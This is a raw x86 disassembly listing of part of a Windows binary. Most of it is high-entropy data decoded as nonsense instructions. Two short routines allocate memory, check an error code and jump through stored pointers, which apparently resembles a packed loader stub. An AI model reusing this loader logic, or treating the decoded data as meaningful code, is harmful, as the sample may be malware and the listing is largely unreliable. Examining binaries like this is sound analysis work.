  422ce6:	fcmovb st,st(6)
  422ce8:	out    dx,al
  422ce9:	mov    ebx,0x2132be9b
  422cee:	aad    0xbf
  422cf0:	push   edx
  422cf1:	pop    ds
  422cf2:	mov    dh,0xc5
  422cf4:	jge    0x422cbc
  422cf6:	xor    ecx,DWORD PTR [edi+ecx*2+0x12]
  422cfa:	out    0xd6,eax
  422cfc:	or     eax,0x368c0231
  422d01:	cmp    dl,BYTE PTR [eiz*4+0x4489e86c]
  422d08:	adc    bh,dl
  422d0a:	jecxz  0x422d00
  422d0c:	imul   eax,edx,0x3b
  422d0f:	(bad)  
  422d10:	cmc    
  422d11:	ss stos DWORD PTR es:[edi],eax
  422d13:	fimul  WORD PTR [edx+ebp*2]
  422d16:	push   edx
  422d17:	or     BYTE PTR [esi-0x7681c9b6],bl
  422d1d:	jo     0x422d1e
  422d1f:	stos   BYTE PTR es:[edi],al
  422d20:	pop    esi
  422d21:	mov    dl,0xb1
  422d23:	pop    ebx
  422d24:	(bad)  
  422d26:	cmp    ebx,DWORD PTR [esi-0x41]
  422d29:	shr    DWORD PTR [ebx+0x52],1
  422d2c:	sbb    DWORD PTR [eax+0x49],0x9680ad20
  422d33:	sti    
  422d34:	jmp    0x422d7a
  422d36:	adc    cl,BYTE PTR [ecx+0x4a029e6c]
  422d3c:	sbb    eax,0x9f0c420e
  422d41:	fild   DWORD PTR [edx+0x471d3dac]
  422d47:	cmp    al,0xa1
  422d49:	or     dh,bl
  422d4b:	push   ebx
  422d4c:	dec    esi
  422d4d:	xor    ebp,edx
  422d4f:	mov    ebp,0xdbed56c3
  422d54:	(bad)  
  422d55:	sbb    cl,BYTE PTR [edx-0x10]
  422d58:	or     DWORD PTR [eax],edi
  422d5a:	fld    DWORD PTR [edx]
  422d5c:	push   es
  422d5d:	ror    DWORD PTR [eax+0x19],0x46
  422d61:	scas   al,BYTE PTR es:[edi]
  422d62:	inc    edx
  422d63:	push   edx
  422d64:	pop    ebx
  422d65:	test   BYTE PTR [ebp+0x2a7b3a5],bh
  422d6b:	stos   BYTE PTR es:[edi],al
  422d6c:	(bad)  
  422d6f:	je     0x422d3f
  422d71:	or     BYTE PTR [esi+0x3cc0f9fb],bl
  422d77:	push   eax
  422d78:	repz push 0xffffffe4
  422d7b:	xor    edx,DWORD PTR [ebx+0x18f00af4]
  422d81:	xor    BYTE PTR [ebx+eax*1-0x48],al
  422d85:	imul   DWORD PTR [ebx+ebp*8]
  422d88:	adc    eax,0x33d62cda
  422d8d:	jecxz  0x422dad
  422d8f:	lea    eax,[ecx]
  422d91:	gs mov bh,0xd4
  422d94:	xchg   DWORD PTR [ebx-0x3feafade],esi
  422d9a:	(bad)  
  422d9b:	cld    
  422d9c:	jns    0x422dac
  422d9e:	push   edx
  422d9f:	pop    eax
  422da0:	neg    BYTE PTR [esi+ebp*2]
  422da3:	pop    eax
  422da4:	dec    edi
  422da5:	jp     0x422da9
  422da7:	lods   al,BYTE PTR ds:[esi]
  422da8:	dec    edx
  422da9:	mov    esi,0x94589988
  422dae:	jns    0x422d9e
  422db0:	xchg   esi,eax
  422db1:	sbb    ch,bl
  422db3:	push   0x12
  422db5:	cs jbe 0x422dd5
  422db8:	inc    ecx
  422db9:	outs   dx,DWORD PTR ds:[esi]
  422dba:	(bad)  
  422dbc:	das    
  422dbd:	in     eax,0x1a
  422dbf:	in     al,0x6
  422dc1:	retf   
  422dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dc3:	sbb    DWORD PTR fs:[edx+0x3aada647],edx
  422dca:	jge    0x422daf
  422dcc:	scas   eax,DWORD PTR es:[edi]
  422dcd:	dec    edx
  422dce:	hlt    
  422dcf:	and    BYTE PTR [esi+eax*2],dl
  422dd2:	cs dec eax
  422dd4:	clc    
  422dd5:	repnz push esp
  422dd7:	xchg   edi,eax
  422dd8:	add    BYTE PTR [ebx-0x7c69fcdd],0xf8
  422ddf:	adc    BYTE PTR [esi],cl
  422de1:	pop    esp
  422de2:	xchg   edx,eax
  422de3:	pop    edi
  422de4:	and    dh,ch
  422de6:	add    al,0x4a
  422de8:	push   esp
  422de9:	pop    ebp
  422dea:	jae    0x422e5e
  422dec:	lea    eax,[edx]
  422dee:	mov    ch,0x3a
  422df0:	adc    dh,BYTE PTR [ebp-0x42]
  422df3:	les    esi,FWORD PTR [esi-0x71]
  422df6:	out    dx,al
  422df7:	outs   dx,DWORD PTR ds:[esi]
  422df8:	push   edi
  422df9:	pop    edi
  422dfa:	cmp    eax,DWORD PTR [ecx-0x7e]
  422dfd:	lods   al,BYTE PTR ds:[esi]
  422dfe:	lock pop esi
  422e00:	add    BYTE PTR [esi-0x70],al
  422e03:	bound  esp,QWORD PTR [ebx]
  422e05:	adc    ch,BYTE PTR [ebx-0x74]
  422e08:	dec    ebp
  422e09:	mov    dh,0x10
  422e0b:	scas   eax,DWORD PTR es:[edi]
  422e0c:	dec    edi
  422e0d:	jmp    0xe470:0x90bc62a2
  422e14:	mov    ds:0x8c38ee8b,eax
  422e19:	mov    ebp,0x54097cd2
  422e1e:	sub    eax,0xeeb2a676
  422e23:	stos   DWORD PTR es:[edi],eax
  422e24:	adc    ebx,esp
  422e26:	xchg   edx,eax
  422e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e28:	enter  0xa640,0x5a
  422e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e2d:	cs mov cl,0xc7
  422e30:	pop    es
  422e31:	or     esi,eax
  422e33:	shl    BYTE PTR [ecx],1
  422e35:	add    BYTE PTR [si-0x31],0xc2
  422e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e3b:	dec    eax
  422e3c:	les    esi,FWORD PTR [edi+0x7b]
  422e3f:	mov    BYTE PTR [esi+0x1b817d1],0x83
  422e46:	or     ecx,0x3c53941d
  422e4c:	push   ebp
  422e4d:	mov    DWORD PTR [eax-0x5905fd33],ecx
  422e53:	cmp    DWORD PTR [eax-0x4e],esp
  422e56:	push   ss
  422e57:	scas   eax,DWORD PTR es:[edi]
  422e58:	je     0x422ed6
  422e5a:	xchg   ebp,eax
  422e5b:	or     BYTE PTR [ebx-0x7653f5c0],ch
  422e61:	adc    BYTE PTR [ecx],bh
  422e63:	jl     0x422e1c
  422e65:	mov    esp,0x5effaded
  422e6a:	xchg   DWORD PTR [edx+0x30],esp
  422e6d:	inc    eax
  422e6e:	cmp    BYTE PTR [edx-0x65d48eb],dl
  422e74:	lock pop esp
  422e76:	jge    0x422ef7
  422e78:	adc    al,0x7f
  422e7a:	mov    ebp,0xd761988c
  422e7f:	mov    edi,0x4104adb0
  422e84:	push   ebx
  422e85:	jnp    0x422e81
  422e87:	ja     0x422ed0
  422e89:	jne    0x422e0f
  422e8b:	pop    es
  422e8c:	popa   
  422e8d:	stos   BYTE PTR es:[edi],al
  422e8e:	jne    0x422e9e
  422e90:	mov    BYTE PTR [eax+0x5e],bh
  422e93:	out    dx,al
  422e94:	adc    al,0xe5
  422e96:	add    BYTE PTR [edx-0x69a78027],bh
  422e9c:	imul   ebx,DWORD PTR [ebx-0x33],0xf33b5d2f
  422ea3:	dec    ecx
  422ea4:	(bad)  
  422ea5:	ja     0x422e3a
  422ea7:	mov    bh,0x6e
  422ea9:	lea    edi,ds:0xeafffc89
  422eaf:	jg     0x422ec2
  422eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eb2:	aad    0x5b
  422eb4:	or     ah,BYTE PTR [ebx+0x15]
  422eb7:	lods   al,BYTE PTR ds:[esi]
  422eb8:	mov    edx,0xafb9b21
  422ebd:	jecxz  0x422ee8
  422ebf:	gs push ebp
  422ec1:	lahf   
  422ec2:	push   0xe4d3b235
  422ec7:	pop    ebx
  422ec8:	mov    bh,0x54
  422eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ecb:	sbb    DWORD PTR [ecx],esp
  422ecd:	fcomp  DWORD PTR [edx-0x38]
  422ed0:	adc    dl,cl
  422ed2:	and    dl,BYTE PTR [esi+0x64]
  422ed5:	add    edx,DWORD PTR [eax-0x5ed0df90]
  422edb:	jmp    0xb1a9656
  422ee0:	inc    ecx
  422ee1:	cmp    ebx,DWORD PTR gs:[ebx-0x1]
  422ee5:	add    esi,0xffffffb3
  422ee8:	push   es
  422ee9:	pop    ebx
  422eea:	clc    
  422eeb:	or     eax,0xd803e202
  422ef0:	mov    edi,DWORD PTR [eax+0x10]
  422ef3:	inc    eax
  422ef4:	in     eax,0x86
  422ef6:	push   edi
  422ef7:	dec    ecx
  422ef8:	test   eax,0xe8be7514
  422efd:	pop    esi
  422efe:	shr    ch,cl
  422f00:	and    ah,BYTE PTR [edi]
  422f02:	xor    ebx,esp
  422f04:	mov    ebp,0xc676e8af
  422f09:	sbb    al,0xe
  422f0b:	sub    ebp,DWORD PTR ds:0xe6cf476e
  422f11:	lods   al,BYTE PTR ds:[esi]
  422f12:	mov    al,ds:0xc90361a9
  422f17:	jo     0x422f1a
  422f19:	add    DWORD PTR [ebx-0x615462a4],ebp
  422f1f:	xor    BYTE PTR [esi-0x4f578693],0x77
  422f26:	loope  0x422eef
  422f28:	inc    edx
  422f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f2a:	or     dh,BYTE PTR [ecx-0x4b]
  422f2d:	adc    al,0xe0
  422f2f:	imul   BYTE PTR [ebx+0xb]
  422f32:	or     al,0x93
  422f34:	enter  0x54d1,0xb4
  422f38:	(bad)  
  422f39:	dec    edx
  422f3a:	mov    edx,0x5e18378f
  422f3f:	clc    
  422f40:	fist   DWORD PTR [eax+0xea3e76a]
  422f46:	leave  
  422f47:	test   BYTE PTR [eax-0x73],0x7f
  422f4b:	push   cs
  422f4c:	xchg   esp,eax
  422f4d:	sub    eax,0x17e72c3e
  422f52:	(bad)  
  422f54:	add    al,0x20
  422f56:	jns    0x422eff
  422f58:	push   es
  422f59:	adc    eax,edx
  422f5b:	jmp    0x5aa9df8
  422f60:	inc    esp
  422f61:	(bad)  
  422f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f63:	jnp    0x422f37
  422f65:	mov    DWORD PTR ds:0x7ac169f2,0xd57cac66
  422f6f:	jl     0x422f3a
  422f71:	out    dx,al
  422f72:	mov    ds:0x4bec24d0,eax
  422f77:	popa   
  422f78:	and    al,0xab
  422f7a:	mov    eax,0x1
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0xa828a8c7
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	inc    eax
  42309a:	pop    esp
  42309b:	sub    dl,0xaf
  42309e:	xchg   edx,eax
  42309f:	(bad)  
  4230a1:	and    ch,BYTE PTR ds:0x7217435d
  4230a7:	push   es
  4230a8:	adc    dl,BYTE PTR [edx-0x54]
  4230ab:	xchg   edx,eax
  4230ac:	vminss xmm0{k5},xmm3,DWORD PTR [ebx]
  4230b2:	call   0xea543744
  4230b7:	lods   al,BYTE PTR ds:[esi]
  4230b8:	xchg   edx,eax
  4230b9:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4230c0:	lea    eax,[esi]
  4230c2:	adc    ch,dl
  4230c4:	lods   al,BYTE PTR ds:[esi]
  4230c5:	xchg   edx,eax
  4230c6:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4230cd:	lea    eax,[esi]
  4230cf:	adc    ch,dl
  4230d1:	lods   al,BYTE PTR ds:[esi]
  4230d2:	xchg   edx,eax
  4230d3:	(bad)
  4230d8:	inc    ebx
  4230d9:	out    0x92,al
  4230db:	mov    esp,0x9b18ea1c
  4230e0:	scas   eax,DWORD PTR es:[edi]
  4230e1:	loopne 0x423081
  4230e3:	sub    al,0x11
  4230e5:	mov    cs,ecx
  4230e7:	fldcw  WORD PTR [esi+0x7b]
  4230ea:	cdq    
  4230eb:	mov    edx,fs
  4230ed:	adc    BYTE PTR [esi+0x2e3c5f41],ch
  4230f3:	enter  0x67ee,0x7c
  4230f7:	test   bl,al
  4230f9:	out    0x42,al
  4230fb:	mov    ds:0x362f0d43,eax
  423100:	xchg   BYTE PTR [ebp-0x17358391],ch
  423106:	fnsave [ecx]
  423108:	loope  0x423155
  42310a:	inc    edx
  42310b:	cmp    DWORD PTR [esi],esp
  42310d:	mov    BYTE PTR [eax-0x5331e7f5],0x92
  423114:	vminss xmm0{k5},xmm3,DWORD PTR [ecx+esi*2+0x1c4]
  42311c:	pop    edi
  42311d:	push   ecx
  42311e:	adc    bh,BYTE PTR [esi]
  423120:	cwde   
  423121:	and    DWORD PTR [ecx],edi
  423123:	mov    ah,0x27
  423125:	push   ds
  423126:	mov    ebx,0x775e877a
  42312b:	out    0xa6,al
  42312d:	int    0x9a
  42312f:	push   ebx
  423130:	sub    al,0x75
  423132:	cmp    BYTE PTR [ebx-0x1e],bh
  423135:	dec    edi
  423136:	inc    BYTE PTR [eax+0x5bf7f4e0]
  42313c:	retf   
  42313d:	dec    esi
  42313e:	aad    0xcf
  423140:	dec    ecx
  423141:	les    eax,FWORD PTR [ebx]
  423143:	aas    
  423144:	sbb    BYTE PTR [esp+edx*2-0x59749800],ch
  42314b:	cmp    al,0x57
  42314d:	or     DWORD PTR [eax],edx
  42314f:	pop    ds
  423150:	or     al,0x58
  423152:	push   0xffffffad
  423154:	cwde   
  423155:	cmp    bh,BYTE PTR [ecx]
  423157:	mov    ah,0x27
  423159:	push   ds
  42315a:	mov    ebx,0xeb2e877b
  42315f:	js     0x423107
  423161:	sub    eax,0x602c41ba
  423166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423167:	shl    edx,1
  423169:	aad    0x63
  42316b:	das    
  42316c:	loopne 0x423112
  42316e:	push   0xfffffff0
  423170:	retf   
  423171:	jle    0x4231bb
  423173:	push   ebp
  423174:	dec    ecx
  423175:	stos   BYTE PTR es:[edi],al
  423176:	jne    0x42310c
  423178:	sbb    BYTE PTR [edx-0x7c976237],dh
  42317e:	fidivr WORD PTR [edi-0x117eeea9]
  423184:	outs   dx,BYTE PTR ds:[esi]
  423185:	push   ecx
  423186:	adc    bh,BYTE PTR [esi]
  423188:	cwde   
  423189:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423190:	lea    edx,[esi+0x57]
  423193:	jmp    0xc126:0xc363deac
  42319a:	mov    esi,0x68da71c
  42319f:	adc    ch,dl
  4231a1:	lods   al,BYTE PTR ds:[esi]
  4231a2:	xchg   edx,eax
  4231a3:	(bad)
  4231a8:	inc    edx
  4231a9:	jecxz  0x423137
  4231ab:	or     al,0x12
  4231ad:	jmp    0x2b22:0xc1629640
  4231b4:	pop    ebp
  4231b5:	inc    ebx
  4231b6:	call   0x57553848
  4231bb:	lods   al,BYTE PTR ds:[esi]
  4231bc:	xchg   edx,eax
  4231bd:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x4c]
  4231c4:	lea    eax,[esi]
  4231c6:	adc    ch,BYTE PTR [ebx-0x3e8d6d54]
  4231cc:	es sub eax,0x88e8435f
  4231d2:	push   es
  4231d3:	adc    ebp,edx
  4231d5:	lods   al,BYTE PTR ds:[esi]
  4231d6:	xchg   edx,eax
  4231d7:	(bad)  
  4231d9:	and    ebp,DWORD PTR ds:0x8de8435c
  4231df:	push   es
  4231e0:	adc    ch,dl
  4231e2:	sub    al,0x99
  4231e4:	(bad)  
  4231e6:	and    ch,BYTE PTR ds:0x88d9fe5d
  4231ec:	push   es
  4231ed:	adc    dl,ch
  4231ef:	lods   al,BYTE PTR ds:[esi]
  4231f0:	adc    ah,BYTE PTR [edx-0x3f]
  4231f3:	ss sub eax,0x8de8535d
  4231f9:	push   es
  4231fa:	adc    bh,dl
  4231fc:	lods   al,BYTE PTR ds:[esi]
  4231fd:	xchg   edx,eax
  4231fe:	jb     0x4231c1
  423200:	es sub eax,0x9de8435d
  423206:	push   es
  423207:	adc    ch,dl
  423209:	lods   al,BYTE PTR ds:[esi]
  42320a:	xchg   edx,eax
  42320b:	vminss xmm0{k5},xmm3,DWORD PTR [ebx+0x1b0]
  423212:	jecxz  0x423221
  423214:	adc    al,BYTE PTR [ebx-0x3e9d6d51]
  42321a:	push   ss
  42321b:	es pop ebp
  42321d:	mov    ebp,ss
  42321f:	lea    eax,[esi]
  423221:	adc    ch,dl
  423223:	lods   al,BYTE PTR ds:[esi]
  423224:	xchg   edx,eax
  423225:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42322c:	lea    eax,[esi]
  42322e:	adc    ch,dl
  423230:	lods   al,BYTE PTR ds:[esi]
  423231:	xchg   edx,eax
  423232:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423239:	lea    eax,[esi]
  42323b:	adc    ch,dl
  42323d:	lods   al,BYTE PTR ds:[esi]
  42323e:	xchg   edx,eax
  42323f:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423246:	lea    eax,[esi]
  423248:	adc    ch,dl
  42324a:	lods   al,BYTE PTR ds:[esi]
  42324b:	xchg   edx,eax
  42324c:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423253:	lea    eax,[esi]
  423255:	adc    ch,dl
  423257:	lods   al,BYTE PTR ds:[esi]
  423258:	xchg   edx,eax
  423259:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423260:	lea    eax,[esi]
  423262:	adc    ch,dl
  423264:	lods   al,BYTE PTR ds:[esi]
  423265:	xchg   edx,eax
  423266:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42326d:	lea    eax,[esi]
  42326f:	adc    ch,dl
  423271:	lods   al,BYTE PTR ds:[esi]
  423272:	xchg   edx,eax
  423273:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42327a:	lea    eax,[esi]
  42327c:	adc    ch,dl
  42327e:	lods   al,BYTE PTR ds:[esi]
  42327f:	xchg   edx,eax
  423280:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423287:	lea    eax,[esi]
  423289:	cmp    al,0x9e
  42328b:	leave  
  42328c:	jmp    0x635d:0x2d26c116
  423293:	jecxz  0x423222
  423295:	push   es
  423296:	add    ch,dl
  423298:	lods   al,BYTE PTR ds:[esi]
  423299:	xchg   edx,eax
  42329a:	pop    eax
  42329b:	lds    esp,FWORD PTR [esi]
  42329d:	sub    eax,0xdde84359
  4232a2:	inc    ebx
  4232a3:	push   ecx
  4232a4:	fdivr  st,st(0)
  4232a6:	frstor [edx-0x3f]
  4232a9:	es sub eax,0x8dc8435d
  4232af:	push   es
  4232b0:	repnz (bad) 
  4232b2:	fsubrp st(1),st
  4232b4:	adc    BYTE PTR [edx+0x435d2d26],ah
  4232ba:	mov    eax,0xda12068d
  4232bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232c0:	xchg   edx,eax
  4232c1:	bound  edx,QWORD PTR [ecx+0x7d5d2d26]
  4232c7:	in     al,dx
  4232c8:	lea    eax,[esi]
  4232ca:	adc    ch,dl
  4232cc:	lods   al,BYTE PTR ds:[esi]
  4232cd:	xchg   edx,eax
  4232ce:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4232d5:	lods   eax,DWORD PTR ds:[esi]
  4232d6:	push   es
  4232d7:	adc    cl,BYTE PTR [edx]
  4232d9:	lods   al,BYTE PTR ds:[esi]
  4232da:	xchg   edx,eax
  4232db:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4232e2:	lea    eax,[esi]
  4232e4:	adc    ch,dl
  4232e6:	lods   al,BYTE PTR ds:[esi]
  4232e7:	xchg   edx,eax
  4232e8:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4232ef:	lea    eax,[esi]
  4232f1:	adc    ch,dl
  4232f3:	lods   al,BYTE PTR ds:[esi]
  4232f4:	xchg   edx,eax
  4232f5:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4232fc:	lea    eax,[esi]
  4232fe:	adc    ch,dl
  423300:	lods   al,BYTE PTR ds:[esi]
  423301:	xchg   edx,eax
  423302:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423309:	lea    eax,[esi]
  42330b:	adc    ch,dl
  42330d:	lods   al,BYTE PTR ds:[esi]
  42330e:	xchg   edx,eax
  42330f:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423316:	lea    eax,[esi]
  423318:	adc    ch,dl
  42331a:	lods   al,BYTE PTR ds:[esi]
  42331b:	xchg   edx,eax
  42331c:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423323:	lea    eax,[esi]
  423325:	adc    ch,dl
  423327:	lods   al,BYTE PTR ds:[esi]
  423328:	xchg   edx,eax
  423329:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423330:	lea    eax,[esi]
  423332:	adc    ch,dl
  423334:	lods   al,BYTE PTR ds:[esi]
  423335:	xchg   edx,eax
  423336:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42333d:	lea    eax,[esi]
  42333f:	adc    ch,dl
  423341:	lods   al,BYTE PTR ds:[esi]
  423342:	xchg   edx,eax
  423343:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42334a:	lea    eax,[esi]
  42334c:	adc    ch,dl
  42334e:	lods   al,BYTE PTR ds:[esi]
  42334f:	xchg   edx,eax
  423350:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423357:	lea    eax,[esi]
  423359:	adc    ch,dl
  42335b:	lods   al,BYTE PTR ds:[esi]
  42335c:	xchg   edx,eax
  42335d:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423364:	lea    eax,[esi]
  423366:	adc    ch,dl
  423368:	lods   al,BYTE PTR ds:[esi]
  423369:	xchg   edx,eax
  42336a:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423371:	lea    eax,[esi]
  423373:	adc    ch,dl
  423375:	lods   al,BYTE PTR ds:[esi]
  423376:	xchg   edx,eax
  423377:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42337e:	lea    eax,[esi]
  423380:	adc    ch,dl
  423382:	lods   al,BYTE PTR ds:[esi]
  423383:	xchg   edx,eax
  423384:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42338b:	lea    eax,[esi]
  42338d:	adc    ch,dl
  42338f:	lods   al,BYTE PTR ds:[esi]
  423390:	xchg   edx,eax
  423391:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423398:	lea    eax,[esi]
  42339a:	adc    ch,dl
  42339c:	lods   al,BYTE PTR ds:[esi]
  42339d:	xchg   edx,eax
  42339e:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233a5:	lea    eax,[esi]
  4233a7:	adc    ch,dl
  4233a9:	lods   al,BYTE PTR ds:[esi]
  4233aa:	xchg   edx,eax
  4233ab:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233b2:	lea    eax,[esi]
  4233b4:	adc    ch,dl
  4233b6:	lods   al,BYTE PTR ds:[esi]
  4233b7:	xchg   edx,eax
  4233b8:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233bf:	lea    eax,[esi]
  4233c1:	adc    ch,dl
  4233c3:	lods   al,BYTE PTR ds:[esi]
  4233c4:	xchg   edx,eax
  4233c5:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233cc:	lea    eax,[esi]
  4233ce:	adc    ch,dl
  4233d0:	lods   al,BYTE PTR ds:[esi]
  4233d1:	xchg   edx,eax
  4233d2:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233d9:	lea    eax,[esi]
  4233db:	adc    ch,dl
  4233dd:	lods   al,BYTE PTR ds:[esi]
  4233de:	xchg   edx,eax
  4233df:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233e6:	lea    eax,[esi]
  4233e8:	adc    ch,dl
  4233ea:	lods   al,BYTE PTR ds:[esi]
  4233eb:	xchg   edx,eax
  4233ec:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  4233f3:	lea    eax,[esi]
  4233f5:	adc    ch,dl
  4233f7:	lods   al,BYTE PTR ds:[esi]
  4233f8:	xchg   edx,eax
  4233f9:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423400:	lea    eax,[esi]
  423402:	adc    ch,dl
  423404:	lods   al,BYTE PTR ds:[esi]
  423405:	xchg   edx,eax
  423406:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42340d:	lea    eax,[esi]
  42340f:	adc    ch,dl
  423411:	lods   al,BYTE PTR ds:[esi]
  423412:	xchg   edx,eax
  423413:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42341a:	lea    eax,[esi]
  42341c:	adc    ch,dl
  42341e:	lods   al,BYTE PTR ds:[esi]
  42341f:	xchg   edx,eax
  423420:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423427:	lea    eax,[esi]
  423429:	adc    ch,dl
  42342b:	lods   al,BYTE PTR ds:[esi]
  42342c:	xchg   edx,eax
  42342d:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423434:	lea    eax,[esi]
  423436:	adc    ch,dl
  423438:	lods   al,BYTE PTR ds:[esi]
  423439:	xchg   edx,eax
  42343a:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423441:	lea    eax,[esi]
  423443:	adc    ch,dl
  423445:	lods   al,BYTE PTR ds:[esi]
  423446:	xchg   edx,eax
  423447:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42344e:	lea    eax,[esi]
  423450:	adc    ch,dl
  423452:	lods   al,BYTE PTR ds:[esi]
  423453:	xchg   edx,eax
  423454:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  42345b:	lea    eax,[esi]
  42345d:	adc    ch,dl
  42345f:	lods   al,BYTE PTR ds:[esi]
  423460:	xchg   edx,eax
  423461:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423468:	lea    eax,[esi]
  42346a:	adc    ch,dl
  42346c:	lods   al,BYTE PTR ds:[esi]
  42346d:	xchg   edx,eax
  42346e:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423475:	lea    eax,[esi]
  423477:	adc    ch,dl
  423479:	lods   al,BYTE PTR ds:[esi]
  42347a:	xchg   edx,eax
  42347b:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
  423482:	lea    eax,[esi]
  423484:	adc    ch,dl
  423486:	lods   al,BYTE PTR ds:[esi]
  423487:	xchg   edx,eax
  423488:	vminss xmm0{k5},xmm3,DWORD PTR [ebx-0x60]
